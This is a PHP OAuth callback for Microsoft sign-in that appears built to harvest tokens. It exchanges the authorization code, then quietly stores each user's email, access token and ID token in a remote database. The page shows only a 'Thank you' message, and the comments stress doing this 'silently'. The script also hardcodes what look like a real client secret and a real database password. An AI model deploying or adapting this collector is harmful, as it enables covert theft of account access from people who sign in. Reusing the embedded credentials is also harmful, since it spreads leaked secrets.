<?php
// --- CONFIG ---
$client_id = '6dff28e9-1e23-4b52-ad14-b1f2b4ed3525';
$client_secret = 'de38Q~901_U0wQBpNYt5hhoNNJqBUs4CehuQFaiM';
$redirect_uri = 'https://render-php-oauth.onrender.com/callback.php';
$token_url = 'https://login.microsoftonline.com/common/oauth2/v2.0/token';

// --- DB (MySQLi) ---
$db_host = 'YOUR_CPANEL_SERVER_IP_OR_HOST'; // NOT localhost
$db_name = 'bearco79_oauth-db';
$db_user = 'bearco79_oauth-user';
$db_pass = 'Loverainbow5@';

// --- START ---
if (!isset($_GET['code'])) {
    echo 'Thank you.';
    exit;
}

$code = $_GET['code'];

// Exchange code for token
$postData = http_build_query([
    'client_id' => $client_id,
    'client_secret' => $client_secret,
    'grant_type' => 'authorization_code',
    'code' => $code,
    'redirect_uri' => $redirect_uri,
    'scope' => 'openid profile email User.Read'
]);

$context = stream_context_create([
    'http' => [
        'method'  => 'POST',
        'header'  => "Content-Type: application/x-www-form-urlencoded\r\n",
        'content' => $postData
    ]
]);

$response = @file_get_contents($token_url, false, $context);
if ($response === false) {
    echo 'Thank you.';
    exit;
}

$token = json_decode($response, true);

// Decode ID token (user info)
$payload = json_decode(
    base64_decode(strtr(explode('.', $token['id_token'])[1], '-_', '+/')),
    true
);

$oid   = $payload['oid'] ?? null;
$email = $payload['preferred_username'] ?? null;

// Store silently (do not break page if DB fails)
$mysqli = @new mysqli($db_host, $db_user, $db_pass, $db_name);
if (!$mysqli->connect_error) {
    $stmt = $mysqli->prepare(
        "INSERT INTO oauth_users (oid, email, access_token, id_token)
         VALUES (?, ?, ?, ?)"
    );
    if ($stmt) {
        $stmt->bind_param(
            "ssss",
            $oid,
            $email,
            $token['access_token'],
            $token['id_token']
        );
        $stmt->execute();
        $stmt->close();
    }
    $mysqli->close();
}

// User sees ONLY this
echo "<h2>Thank you! You may now close this page.</h2>";
